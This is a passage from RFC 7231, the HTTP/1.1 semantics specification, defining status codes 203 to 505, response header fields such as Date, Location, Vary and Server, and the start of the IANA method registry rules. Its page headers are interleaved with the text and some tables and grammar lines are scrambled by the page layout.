content might only be applicable along the same request path (through the same proxies).
The 203 response is similar to the Warning code of 214 Transformation Applied (Section 5.5 of [RFC7234]), which has the advantage of being applicable to responses with any status code.
Fielding & Reschke Standards Track [Page 52]
     RFC 7231 HTTP/1.1 Semantics and Content June 2014
A 203 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
6.3.5. 204 No Content
The 204 (No Content) status code indicates that the server has successfully fulfilled the request and that there is no additional content to send in the response payload body. Metadata in the response header fields refer to the target resource and its selected representation after the requested action was applied.
For example, if a 204 status code is received in response to a PUT request and the response contains an ETag header field, then the PUT was successful and the ETag field-value contains the entity-tag for
the new representation of that target resource.
The 204 response allows a server to indicate that the action has been successfully applied to the target resource, while implying that the user agent does not need to traverse away from its current "document view" (if any). The server assumes that the user agent will provide some indication of the success to its user, in accord with its own interface, and apply any new or updated metadata in the response to its active representation.
For example, a 204 status code is commonly used with document editing interfaces corresponding to a "save" action, such that the document being saved remains available to the user for editing. It is also
frequently used with interfaces that expect automated data transfers
to be prevalent, such as within distributed version control systems.
   A 204 response is terminated by the first empty line after the header fields because it cannot contain a message body.
A 204 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
6.3.6. 205 Reset Content
The 205 (Reset Content) status code indicates that the server has fulfilled the request and desires that the user agent reset the "document view", which caused the request to be sent, to its original state as received from the origin server.
This response is intended to support a common data entry use case where the user receives content that supports data entry (a form, notepad, canvas, etc.), enters or manipulates data in that space,
Fielding & Reschke Standards Track [Page 53]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
causes the entered data to be submitted in a request, and then the data entry mechanism is reset for the next entry so that the user can easily initiate another input action.
Since the 205 status code implies that no additional content will be provided, a server MUST NOT generate a payload in a 205 response. In other words, a server MUST do one of the following for a 205
response: a) indicate a zero-length body for the response by
including a Content-Length header field with a value of 0; b)
   indicate a zero-length payload for the response by including a Transfer-Encoding header field with a value of chunked and a message body consisting of a single chunk of zero-length; or, c) close the connection immediately after sending the blank line terminating the header section.
6.4. Redirection 3xx
The 3xx (Redirection) class of status code indicates that further action needs to be taken by the user agent in order to fulfill the request. If a Location header field (Section 7.1.2) is provided, the user agent MAY automatically redirect its request to the URI referenced by the Location field value, even if the specific status code is not understood. Automatic redirection needs to done with care for methods not known to be safe, as defined in Section 4.2.1, since the user might not wish to redirect an unsafe request.
There are several types of redirects:
  1.
2.
3.
4.
Redirects that indicate the resource might be available at a different URI, as provided by the Location field, as in the status codes 301 (Moved Permanently), 302 (Found), and 307 (Temporary Redirect).
Redirection that offers a choice of matching resources, each capable of representing the original request target, as in the 300 (Multiple Choices) status code.
Redirection to a different resource, identified by the Location field, that can represent an indirect response to the request, as in the 303 (See Other) status code.
Redirection to a previously cached result, as in the 304 (Not Modified) status code. Note: In HTTP/1.0, the status codes 301 (Moved Permanently) and 302 (Found) were defined for the first type of redirect
([RFC1945], Section 9.3). Early user agents split on whether the method applied to the redirect target would be the same as the
Fielding & Reschke Standards Track [Page 54]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
original request or would be rewritten as GET. Although HTTP originally defined the former semantics for 301 and 302 (to match its original implementation at CERN), and defined 303 (See Other) to match the latter semantics, prevailing practice gradually converged on the latter semantics for 301 and 302 as well. The first revision of HTTP/1.1 added 307 (Temporary Redirect) to indicate the former semantics without being impacted by divergent practice. Over 10 years later, most user agents still do method rewriting for 301 and 302; therefore, this specification makes
that behavior conformant when the original request is POST.
A client SHOULD detect and intervene in cyclical redirections (i.e., "infinite" redirection loops).
Note: An earlier version of this specification recommended a maximum of five redirections ([RFC2068], Section 10.3). Content developers need to be aware that some clients might implement such a fixed limitation.
6.4.1. 300 Multiple Choices
The 300 (Multiple Choices) status code indicates that the target
     resource has more than one representation, each with its own more specific identifier, and information about the alternatives is being provided so that the user (or user agent) can select a preferred representation by redirecting its request to one or more of those identifiers. In other words, the server desires that the user agent engage in reactive negotiation to select the most appropriate representation(s) for its needs (Section 3.4).
If the server has a preferred choice, the server SHOULD generate a Location header field containing a preferred choice's URI reference. The user agent MAY use the Location field value for automatic redirection.
For request methods other than HEAD, the server SHOULD generate a payload in the 300 response containing a list of representation metadata and URI reference(s) from which the user or user agent can choose the one most preferred. The user agent MAY make a selection from that list automatically if it understands the provided media
type. A specific format for automatic selection is not defined by this specification because HTTP tries to remain orthogonal to the definition of its payloads. In practice, the representation is provided in some easily parsed format believed to be acceptable to the user agent, as determined by shared design or content negotiation, or in some commonly accepted hypertext format.
Fielding & Reschke Standards Track [Page 55]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
 A 300 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
Note: The original proposal for the 300 status code defined the
URI header field as providing a list of alternative
representations, such that it would be usable for 200, 300, and
406 responses and be transferred in responses to the HEAD method. However, lack of deployment and disagreement over syntax led to both URI and Alternates (a subsequent proposal) being dropped from this specification. It is possible to communicate the list using
a set of Link header fields [RFC5988], each with a relationship of "alternate", though deployment is a chicken-and-egg problem.
6.4.2. 301 Moved Permanently
The 301 (Moved Permanently) status code indicates that the target resource has been assigned a new permanent URI and any future references to this resource ought to use one of the enclosed URIs. Clients with link-editing capabilities ought to automatically re-link references to the effective request URI to one or more of the new references sent by the server, where possible.
The server SHOULD generate a Location header field in the response containing a preferred URI reference for the new permanent URI. The user agent MAY use the Location field value for automatic redirection. The server's response payload usually contains a short hypertext note with a hyperlink to the new URI(s).
Note: For historical reasons, a user agent MAY change the request method from POST to GET for the subsequent request. If this behavior is undesired, the 307 (Temporary Redirect) status code can be used instead.
A 301 response is cacheable by default; i.e., unless otherwise
   indicated by the method definition or explicit cache controls (see
Section 4.2.2 of [RFC7234]). 6.4.3. 302 Found
The 302 (Found) status code indicates that the target resource resides temporarily under a different URI. Since the redirection might be altered on occasion, the client ought to continue to use the effective request URI for future requests.
   Fielding & Reschke Standards Track [Page 56]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
The server SHOULD generate a Location header field in the response containing a URI reference for the different URI. The user agent MAY use the Location field value for automatic redirection. The server's response payload usually contains a short hypertext note with a hyperlink to the different URI(s).
Note: For historical reasons, a user agent MAY change the request method from POST to GET for the subsequent request. If this behavior is undesired, the 307 (Temporary Redirect) status code can be used instead.
6.4.4. 303 See Other
 The 303 (See Other) status code indicates that the server is redirecting the user agent to a different resource, as indicated by a URI in the Location header field, which is intended to provide an indirect response to the original request. A user agent can perform
a retrieval request targeting that URI (a GET or HEAD request if
using HTTP), which might also be redirected, and present the eventual result as an answer to the original request. Note that the new URI
in the Location header field is not considered equivalent to the effective request URI.
This status code is applicable to any HTTP method. It is primarily used to allow the output of a POST action to redirect the user agent to a selected resource, since doing so provides the information corresponding to the POST response in a form that can be separately identified, bookmarked, and cached, independent of the original request.
A 303 response to a GET request indicates that the origin server does not have a representation of the target resource that can be transferred by the server over HTTP. However, the Location field value refers to a resource that is descriptive of the target
resource, such that making a retrieval request on that other resource might result in a representation that is useful to recipients without implying that it represents the original target resource. Note that answers to the questions of what can be represented, what representations are adequate, and what might be a useful description are outside the scope of HTTP.
Except for responses to a HEAD request, the representation of a 303 response ought to contain a short hypertext note with a hyperlink to the same URI reference provided in the Location header field. Fielding & Reschke Standards Track [Page 57]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 6.4.5. 305 Use Proxy
The 305 (Use Proxy) status code was defined in a previous version of this specification and is now deprecated (Appendix B).
6.4.6. 306 (Unused)
The 306 status code was defined in a previous version of this
specification, is no longer used, and the code is reserved.
6.4.7. 307 Temporary Redirect
The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI. Since the redirection can change over time, the client ought to continue using the original effective request URI for future requests.
The server SHOULD generate a Location header field in the response containing a URI reference for the different URI. The user agent MAY use the Location field value for automatic redirection. The server's response payload usually contains a short hypertext note with a hyperlink to the different URI(s).
Note: This status code is similar to 302 (Found), except that it
   does not allow changing the request method from POST to GET. This specification defines no equivalent counterpart for 301 (Moved Permanently) ([RFC7238], however, defines the status code 308 (Permanent Redirect) for this purpose).
6.5. Client Error 4xx
The 4xx (Client Error) class of status code indicates that the client seems to have erred. Except when responding to a HEAD request, the server SHOULD send a representation containing an explanation of the error situation, and whether it is a temporary or permanent
condition. These status codes are applicable to any request method. User agents SHOULD display any included representation to the user.
6.5.1. 400 Bad Request
The 400 (Bad Request) status code indicates that the server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).
Fielding & Reschke Standards Track [Page 58]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 6.5.2. 402 Payment Required
The 402 (Payment Required) status code is reserved for future use.
   6.5.3. 403 Forbidden
The 403 (Forbidden) status code indicates that the server understood the request but refuses to authorize it. A server that wishes to
make public why the request has been forbidden can describe that reason in the response payload (if any).
If authentication credentials were provided in the request, the server considers them insufficient to grant access. The client SHOULD NOT automatically repeat the request with the same credentials. The client MAY repeat the request with new or different credentials. However, a request might be forbidden for reasons unrelated to the credentials.
An origin server that wishes to "hide" the current existence of a forbidden target resource MAY instead respond with a status code of 404 (Not Found).
6.5.4. 404 Not Found
The 404 (Not Found) status code indicates that the origin server did
not find a current representation for the target resource or is not
willing to disclose that one exists. A 404 status code does not
indicate whether this lack of representation is temporary or
permanent; the 410 (Gone) status code is preferred over 404 if the
origin server knows, presumably through some configurable means, that the condition is likely to be permanent.
A 404 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
6.5.5. 405 Method Not Allowed
The 405 (Method Not Allowed) status code indicates that the method
     received in the request-line is known by the origin server but not supported by the target resource. The origin server MUST generate an Allow header field in a 405 response containing a list of the target resource's currently supported methods.
A 405 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
Fielding & Reschke Standards Track [Page 59]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 6.5.6. 406 Not Acceptable
The 406 (Not Acceptable) status code indicates that the target resource does not have a current representation that would be acceptable to the user agent, according to the proactive negotiation header fields received in the request (Section 5.3), and the server
is unwilling to supply a default representation.
The server SHOULD generate a payload containing a list of available representation characteristics and corresponding resource identifiers from which the user or user agent can choose the one most appropriate. A user agent MAY automatically select the most appropriate choice from that list. However, this specification does not define any standard for such automatic selection, as described in Section 6.4.1.
6.5.7. 408 Request Timeout
       The 408 (Request Timeout) status code indicates that the server did
not receive a complete request message within the time that it was prepared to wait. A server SHOULD send the "close" connection option (Section 6.1 of [RFC7230]) in the response, since 408 implies that
the server has decided to close the connection rather than continue waiting. If the client has an outstanding request in transit, the
client MAY repeat that request on a new connection.
6.5.8. 409 Conflict
The 409 (Conflict) status code indicates that the request could not
be completed due to a conflict with the current state of the target resource. This code is used in situations where the user might be
able to resolve the conflict and resubmit the request. The server SHOULD generate a payload that includes enough information for a user to recognize the source of the conflict.
Conflicts are most likely to occur in response to a PUT request. For example, if versioning were being used and the representation being PUT included changes to a resource that conflict with those made by an earlier (third-party) request, the origin server might use a 409 response to indicate that it can't complete the request. In this
case, the response representation would likely contain information useful for merging the differences based on the revision history.
6.5.9. 410 Gone
The 410 (Gone) status code indicates that access to the target resource is no longer available at the origin server and that this condition is likely to be permanent. If the origin server does not
Fielding & Reschke Standards Track [Page 60]
   RFC 7231 HTTP/1.1 Semantics and Content June 2014
know, or has no facility to determine, whether or not the condition is permanent, the status code 404 (Not Found) ought to be used instead.
The 410 response is primarily intended to assist the task of web maintenance by notifying the recipient that the resource is intentionally unavailable and that the server owners desire that remote links to that resource be removed. Such an event is common for limited-time, promotional services and for resources belonging to individuals no longer associated with the origin server's site. It
is not necessary to mark all permanently unavailable resources as "gone" or to keep the mark for any length of time -- that is left to the discretion of the server owner.
A 410 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
6.5.10. 411 Length Required
The 411 (Length Required) status code indicates that the server refuses to accept the request without a defined Content-Length (Section 3.3.2 of [RFC7230]). The client MAY repeat the request if it adds a valid Content-Length header field containing the length of the message body in the request message.
6.5.11. 413 Payload Too Large
The 413 (Payload Too Large) status code indicates that the server is
refusing to process a request because the request payload is larger
       than the server is willing or able to process. The server MAY close the connection to prevent the client from continuing the request.
If the condition is temporary, the server SHOULD generate a Retry-After header field to indicate that it is temporary and after what time the client MAY try again.
6.5.12. 414 URI Too Long
The 414 (URI Too Long) status code indicates that the server is refusing to service the request because the request-target (Section
5.3 of [RFC7230]) is longer than the server is willing to interpret.
This rare condition is only likely to occur when a client has
improperly converted a POST request to a GET request with long query information, when the client has descended into a "black hole" of redirection (e.g., a redirected URI prefix that points to a suffix of
itself) or when the server is under attack by a client attempting to exploit potential security holes.
Fielding & Reschke Standards Track [Page 61]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
A 414 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
6.5.13. 415 Unsupported Media Type
The 415 (Unsupported Media Type) status code indicates that the
origin server is refusing to service the request because the payload
       is in a format not supported by this method on the target resource. The format problem might be due to the request's indicated Content-Type or Content-Encoding, or as a result of inspecting the data directly.
6.5.14. 417 Expectation Failed
The 417 (Expectation Failed) status code indicates that the expectation given in the request's Expect header field (Section 5.1.1) could not be met by at least one of the inbound servers.
6.5.15. 426 Upgrade Required
The 426 (Upgrade Required) status code indicates that the server refuses to perform the request using the current protocol but might be willing to do so after the client upgrades to a different
protocol. The server MUST send an Upgrade header field in a 426 response to indicate the required protocol(s) (Section 6.7 of [RFC7230]).
Example:
HTTP/1.1 426 Upgrade Required Upgrade: HTTP/3.0
Connection: Upgrade Content-Length: 53 Content-Type: text/plain
This service requires use of the HTTP/3.0 protocol.
6.6. Server Error 5xx
The 5xx (Server Error) class of status code indicates that the server
is aware that it has erred or is incapable of performing the
     requested method. Except when responding to a HEAD request, the server SHOULD send a representation containing an explanation of the error situation, and whether it is a temporary or permanent
Fielding & Reschke Standards Track [Page 62]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
condition. A user agent SHOULD display any included representation to the user. These response codes are applicable to any request method.
6.6.1. 500 Internal Server Error
The 500 (Internal Server Error) status code indicates that the server encountered an unexpected condition that prevented it from fulfilling the request.
6.6.2. 501 Not Implemented
The 501 (Not Implemented) status code indicates that the server does not support the functionality required to fulfill the request. This
is the appropriate response when the server does not recognize the request method and is not capable of supporting it for any resource.
A 501 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls (see Section 4.2.2 of [RFC7234]).
     6.6.3. 502 Bad Gateway
The 502 (Bad Gateway) status code indicates that the server, while acting as a gateway or proxy, received an invalid response from an inbound server it accessed while attempting to fulfill the request.
6.6.4. 503 Service Unavailable
The 503 (Service Unavailable) status code indicates that the server
is currently unable to handle the request due to a temporary overload or scheduled maintenance, which will likely be alleviated after some delay. The server MAY send a Retry-After header field
(Section 7.1.3) to suggest an appropriate amount of time for the client to wait before retrying the request.
Note: The existence of the 503 status code does not imply that a server has to use it when becoming overloaded. Some servers might simply refuse the connection.
6.6.5. 504 Gateway Timeout
The 504 (Gateway Timeout) status code indicates that the server, while acting as a gateway or proxy, did not receive a timely response from an upstream server it needed to access in order to complete the request.
Fielding & Reschke Standards Track [Page 63]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
     6.6.6. 505 HTTP Version Not Supported
The 505 (HTTP Version Not Supported) status code indicates that the server does not support, or refuses to support, the major version of HTTP that was used in the request message. The server is indicating that it is unable or unwilling to complete the request using the same major version as the client, as described in Section 2.6 of
[RFC7230], other than with this error message. The server SHOULD generate a representation for the 505 response that describes why that version is not supported and what other protocols are supported by that server.
7. Response Header Fields
The response header fields allow the server to pass additional information about the response beyond what is placed in the status-line. These header fields give information about the server, about further access to the target resource, or about related resources.
Although each response header field has a defined meaning, in general, the precise semantics might be further refined by the semantics of the request method and/or response status code.
7.1. Control Data
Response header fields can supply control data that supplements the status code, directs caching, or instructs the client where to go
next.
+-------------------+--------------------------+ | Header Field Name | Defined in... | +-------------------+--------------------------+ | Age | Section 5.1 of [RFC7234] |
     | Cache-Control | Section 5.2 of [RFC7234] |
  | Expires
| Date
| Location
| Retry-After
| Vary
| Warning +-------------------+--------------------------+
| Section 5.3 of [RFC7234] |
  | Section 7.1.1.2 | Section 7.1.2
| |
| |
  | Section 7.1.3 | Section 7.1.4
  | Section 5.5 of [RFC7234] |
  Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content
7.1.1. Origination Date 7.1.1.1. Date/Time Formats
[Page 64]
June 2014
   Prior to 1995, there were three different formats commonly used by servers to communicate timestamps. For compatibility with old implementations, all three are defined here. The preferred format is a fixed-length and single-zone subset of the date and time specification used by the Internet Message Format [RFC5322].
HTTP-date = IMF-fixdate / obs-date
 An example of the preferred format is
Sun, 06 Nov 1994 08:49:37 GMT ; IMF-fixdate
Examples of the two obsolete formats are
Sunday, 06-Nov-94 08:49:37 GMT ; obsolete RFC 850 format
Sun Nov 6 08:49:37 1994 ; ANSI C's asctime() format
A recipient that parses a timestamp value in an HTTP header field MUST accept all three HTTP-date formats. When a sender generates a header field that contains one or more timestamps defined as HTTP-date, the sender MUST generate those timestamps in the IMF-fixdate format.
An HTTP-date value represents time as an instance of Coordinated Universal Time (UTC). The first two formats indicate UTC by the three-letter abbreviation for Greenwich Mean Time, "GMT", a predecessor of the UTC name; values in the asctime format are assumed to be in UTC. A sender that generates HTTP-date values from a local clock ought to use NTP ([RFC5905]) or some similar protocol to synchronize its clock to UTC.
Preferred format:
IMF-fixdate = day-name "," SP date1 SP time-of-day SP GMT ; fixed length/zone/capitalization subset of the format
; see Section 3.3 of [RFC5322]
day-name = %x4D.6F.6E ; "Mon", case-sensitive / %x54.75.65 ; "Tue", case-sensitive
/ %x57.65.64 ; "Wed", case-sensitive
/ %x54.68.75 ; "Thu", case-sensitive
/ %x46.72.69 ; "Fri", case-sensitive / %x53.61.74 ; "Sat", case-sensitive
   / %x53.75.6E ; "Sun", case-sensitive
Fielding & Reschke Standards Track
[Page 65]
June 2014
RFC 7231
date1
day month
HTTP/1.1 Semantics and Content
= day SP month SP year ; e.g., 02 Jun 1982
= 2DIGIT
= %x4A.61.6E ; "Jan", case-sensitive
/ %x46.65.62 ; "Feb", case-sensitive / %x4D.61.72 ; "Mar", case-sensitive / %x41.70.72 ; "Apr", case-sensitive / %x4D.61.79 ; "May", case-sensitive / %x4A.75.6E ; "Jun", case-sensitive / %x4A.75.6C ; "Jul", case-sensitive / %x41.75.67 ; "Aug", case-sensitive / %x53.65.70 ; "Sep", case-sensitive / %x4F.63.74 ; "Oct", case-sensitive / %x4E.6F.76 ; "Nov", case-sensitive / %x44.65.63 ; "Dec", case-sensitive
= 4DIGIT
= %x47.4D.54 ; "GMT", case-sensitive
 year
GMT
time-of-day = hour ":" minute ":" second
; 00:00:00 - 23:59:60 (leap second)
hour = 2DIGIT minute = 2DIGIT second = 2DIGIT Obsolete formats:
obs-date = rfc850-date / asctime-date
rfc850-date = day-name-l "," SP date2 SP time-of-day SP GMT date2 = day "-" month "-" 2DIGIT
; e.g., 02-Jun-82
day-name-l = %x4D.6F.6E.64.61.79 ; "Monday", case-sensitive / %x54.75.65.73.64.61.79 ; "Tuesday", case-sensitive
/ %x57.65.64.6E.65.73.64.61.79 ; "Wednesday", case-sensitive / %x54.68.75.72.73.64.61.79 ; "Thursday", case-sensitive
/ %x46.72.69.64.61.79 ; "Friday", case-sensitive
/ %x53.61.74.75.72.64.61.79 ; "Saturday", case-sensitive / %x53.75.6E.64.61.79 ; "Sunday", case-sensitive
asctime-date = day-name SP date3 SP time-of-day SP year date3 = month SP ( 2DIGIT / ( SP 1DIGIT ))
; e.g., Jun 2
Fielding & Reschke Standards Track [Page 66]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
HTTP-date is case sensitive. A sender MUST NOT generate additional whitespace in an HTTP-date beyond that specifically included as SP in the grammar. The semantics of day-name, day, month, year, and
   time-of-day are the same as those defined for the Internet Message Format constructs with the corresponding name ([RFC5322], Section 3.3).
Recipients of a timestamp value in rfc850-date format, which uses a two-digit year, MUST interpret a timestamp that appears to be more than 50 years in the future as representing the most recent year in the past that had the same last two digits.
Recipients of timestamp values are encouraged to be robust in parsing timestamps unless otherwise restricted by the field definition. For example, messages are occasionally forwarded over HTTP from a non-HTTP source that might generate any of the date and time specifications defined by the Internet Message Format.
Note: HTTP requirements for the date/time stamp format apply only to their usage within the protocol stream. Implementations are
not required to use these formats for user presentation, request logging, etc.
7.1.1.2. Date
The "Date" header field represents the date and time at which the message was originated, having the same semantics as the Origination Date Field (orig-date) defined in Section 3.6.1 of [RFC5322]. The
field value is an HTTP-date, as defined in Section 7.1.1.1.
Date = HTTP-date An example is
Date: Tue, 15 Nov 1994 08:12:31 GMT
When a Date header field is generated, the sender SHOULD generate its field value as the best available approximation of the date and time
       of message generation. In theory, the date ought to represent the moment just before the payload is generated. In practice, the date can be generated at any time during message origination.
An origin server MUST NOT send a Date header field if it does not have a clock capable of providing a reasonable approximation of the current instance in Coordinated Universal Time. An origin server MAY send a Date header field if the response is in the 1xx
(Informational) or 5xx (Server Error) class of status codes. An
origin server MUST send a Date header field in all other cases.
Fielding & Reschke Standards Track [Page 67]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
A recipient with a clock that receives a response message without a Date header field MUST record the time it was received and append a corresponding Date header field to the message's header section if it is cached or forwarded downstream.
A user agent MAY send a Date header field in a request, though generally will not do so unless it is believed to convey useful information to the server. For example, custom applications of HTTP might convey a Date if the server is expected to adjust its interpretation of the user's request based on differences between the user agent and server clocks.
7.1.2. Location
The "Location" header field is used in some responses to refer to a
specific resource in relation to the response. The type of
 relationship is defined by the combination of request method and status code semantics.
Location = URI-reference
The field value consists of a single URI-reference. When it has the form of a relative reference ([RFC3986], Section 4.2), the final value is computed by resolving it against the effective request URI ([RFC3986], Section 5).
For 201 (Created) responses, the Location value refers to the primary resource created by the request. For 3xx (Redirection) responses, the Location value refers to the preferred target resource for automatically redirecting the request.
If the Location value provided in a 3xx (Redirection) response does not have a fragment component, a user agent MUST process the redirection as if the value inherits the fragment component of the URI reference used to generate the request target (i.e., the redirection inherits the original reference's fragment, if any).
For example, a GET request generated for the URI reference "http://www.example.org/~tim" might result in a 303 (See Other) response containing the header field:
Location: /People.html#tim
which suggests that the user agent redirect to "http://www.example.org/People.html#tim"
   Fielding & Reschke Standards Track [Page 68]
RFC 7231 HTTP/1.1 Semantics and Content
June 2014
 Likewise, a GET request generated for the URI reference "http://www.example.org/index.html#larry" might result in a 301 (Moved Permanently) response containing the header field:
Location: http://www.example.net/index.html
which suggests that the user agent redirect to "http://www.example.net/index.html#larry", preserving the original fragment identifier.
There are circumstances in which a fragment identifier in a Location value would not be appropriate. For example, the Location header field in a 201 (Created) response is supposed to provide a URI that is specific to the created resource.
Note: Some recipients attempt to recover from Location fields that are not valid URI references. This specification does not mandate or define such processing, but does allow it for the sake of robustness.
Note: The Content-Location header field (Section 3.1.4.2) differs from Location in that the Content-Location refers to the most specific resource corresponding to the enclosed representation. It is therefore possible for a response to contain both the Location and Content-Location header fields.
7.1.3. Retry-After
Servers send the "Retry-After" header field to indicate how long the
 user agent ought to wait before making a follow-up request. When sent with a 503 (Service Unavailable) response, Retry-After indicates how long the service is expected to be unavailable to the client. When sent with any 3xx (Redirection) response, Retry-After indicates the minimum time that the user agent is asked to wait before issuing the redirected request.
The value of this field can be either an HTTP-date or a number of seconds to delay after the response is received.
Retry-After = HTTP-date / delay-seconds
A delay-seconds value is a non-negative decimal integer, representing time in seconds.
delay-seconds = 1*DIGIT
Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content Two examples of its use are
Retry-After: Fri, 31 Dec 1999 23:59:59 GMT Retry-After: 120
In the latter example, the delay is 2 minutes.
[Page 69]
June 2014
 7.1.4. Vary
The "Vary" header field in a response describes what parts of a request message, aside from the method, Host header field, and request target, might influence the origin server's process for selecting and representing this response. The value consists of either a single asterisk ("*") or a list of header field names (case-insensitive).
Vary = "*" / 1#field-name
A Vary field value of "*" signals that anything about the request might play a role in selecting the response representation, possibly including elements outside the message syntax (e.g., the client's network address). A recipient will not be able to determine whether this response is appropriate for a later request without forwarding the request to the origin server. A proxy MUST NOT generate a Vary field with a "*" value.
A Vary field value consisting of a comma-separated list of names indicates that the named request header fields, known as the selecting header fields, might have a role in selecting the representation. The potential selecting header fields are not limited to those defined by this specification.
For example, a response that contains Vary: accept-encoding, accept-language
indicates that the origin server might have used the request's Accept-Encoding and Accept-Language fields (or lack thereof) as determining factors while choosing the content for this response.
An origin server might send Vary with a list of fields for two purposes:
 1. To inform cache recipients that they MUST NOT use this response to satisfy a later request unless the later request has the same values for the listed fields as the original request (Section 4.1
of [RFC7234]). In other words, Vary expands the cache key required to match a new request to the stored cache entry.
Fielding & Reschke Standards Track [Page 70]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
2. To inform user agent recipients that this response is subject to content negotiation (Section 5.3) and that a different representation might be sent in a subsequent request if additional parameters are provided in the listed header fields (proactive negotiation).
An origin server SHOULD send a Vary header field when its algorithm for selecting a representation varies based on aspects of the request message other than the method and request target, unless the variance cannot be crossed or the origin server has been deliberately
configured to prevent cache transparency. For example, there is no need to send the Authorization field name in Vary because reuse across users is constrained by the field definition (Section 4.2 of [RFC7235]). Likewise, an origin server might use Cache-Control directives (Section 5.2 of [RFC7234]) to supplant Vary if it
considers the variance less significant than the performance cost of Vary's impact on caching.
7.2. Validator Header Fields
       Validator header fields convey metadata about the selected representation (Section 3). In responses to safe requests, validator fields describe the selected representation chosen by the origin server while handling the response. Note that, depending on the status code semantics, the selected representation for a given response is not necessarily the same as the representation enclosed as response payload.
In a successful response to a state-changing request, validator fields describe the new representation that has replaced the prior selected representation as a result of processing the request.
For example, an ETag header field in a 201 (Created) response communicates the entity-tag of the newly created resource's representation, so that it can be used in later conditional requests to prevent the "lost update" problem [RFC7232].
  +-------------------+--------------------------+
| Header Field Name | Defined in... | +-------------------+--------------------------+
| ETag | Section 2.3 of [RFC7232] |
| Last-Modified | Section 2.2 of [RFC7232] | +-------------------+--------------------------+
    Fielding & Reschke Standards Track
RFC 7231 HTTP/1.1 Semantics and Content 1,537
[Page 71]
June 2014

7.3. Authentication Challenges
Authentication challenges indicate what mechanisms are available for
the client to provide authentication credentials in future requests.
+--------------------+--------------------------+
| Header Field Name | Defined in... | +--------------------+--------------------------+
| WWW-Authenticate | Section 4.1 of [RFC7235] | | Proxy-Authenticate | Section 4.3 of [RFC7235] | +--------------------+--------------------------+
7.4. Response Context
The remaining response header fields provide more information about
the target resource for potential use in later requests.
+-------------------+--------------------------+
| Header Field Name | Defined in... | +-------------------+--------------------------+
| Accept-Ranges | Section 2.3 of [RFC7233] | | Allow | Section 7.4.1 |
| Server | Section 7.4.2 | +-------------------+--------------------------+
7.4.1. Allow
The "Allow" header field lists the set of methods advertised as supported by the target resource. The purpose of this field is strictly to inform the recipient of valid request methods associated with the resource.
Allow = #method
         Example of use:
Allow: GET, HEAD, PUT
The actual set of allowed methods is defined by the origin server at the time of each request. An origin server MUST generate an Allow field in a 405 (Method Not Allowed) response and MAY do so in any other response. An empty Allow field value indicates that the resource allows no methods, which might occur in a 405 response if the resource has been temporarily disabled by configuration.
A proxy MUST NOT modify the Allow header field -- it does not need to understand all of the indicated methods in order to handle them according to the generic message handling rules.
Fielding & Reschke Standards Track [Page 72]
RFC 7231 HTTP/1.1 Semantics and Content June 2014 7.4.2. Server
The "Server" header field contains information about the software used by the origin server to handle the request, which is often used by clients to help identify the scope of reported interoperability problems, to work around or tailor requests to avoid particular server limitations, and for analytics regarding server or operating system use. An origin server MAY generate a Server field in its responses.
Server = product *( RWS ( product / comment ) )
 The Server field-value consists of one or more product identifiers, each followed by zero or more comments (Section 3.2 of [RFC7230]), which together identify the origin server software and its
significant subproducts. By convention, the product identifiers are listed in decreasing order of their significance for identifying the origin server software. Each product identifier consists of a name and optional version, as defined in Section 5.5.3.
Example:
Server: CERN/3.0 libwww/2.17
An origin server SHOULD NOT generate a Server field containing needlessly fine-grained detail and SHOULD limit the addition of subproducts by third parties. Overly long and detailed Server field values increase response latency and potentially reveal internal implementation details that might make it (slightly) easier for attackers to find and exploit known security holes.
8. IANA Considerations 8.1. Method Registry
The "Hypertext Transfer Protocol (HTTP) Method Registry" defines the namespace for the request method token (Section 4). The method registry has been created and is now maintained at <http://www.iana.org/assignments/http-methods>.
       Fielding & Reschke Standards Track [Page 73]
RFC 7231 HTTP/1.1 Semantics and Content June 2014
8.1.1. Procedure
HTTP method registrations MUST include the following fields:
o Method Name (see Section 4)
o Safe ("yes" or "no", see Section 4.2.1)
o Idempotent ("yes" or "no", see Section 4.2.2)
o Pointer to specification text
Values to be added to this namespace require IETF Review (see [RFC5226], Section 4.1).
8.1.2. Considerations for New Methods
Standardized methods are generic; that is, they are potentially applicable to any resource, not just one particular media type, kind of resource, or application. As such, it is preferred that new methods be registered in a document that isn't specific to a single application or data format, since orthogonal technologies deserve orthogonal specification.
       Since message parsing (Section 3.3 of [RFC7230]) needs to be independent of method semantics (aside from responses to HEAD), definitions of new methods cannot change the parsing algorithm or prohibit the presence of a message body on either the request or the response message. Definitions of new methods can specify that only a zero-length message body is allowed by requiring a Content-Length header field with a value of "0".
A new method definition needs to indicate whether it is safe
(Section 4.2.1), idempotent (Section 4.2.2), cacheable
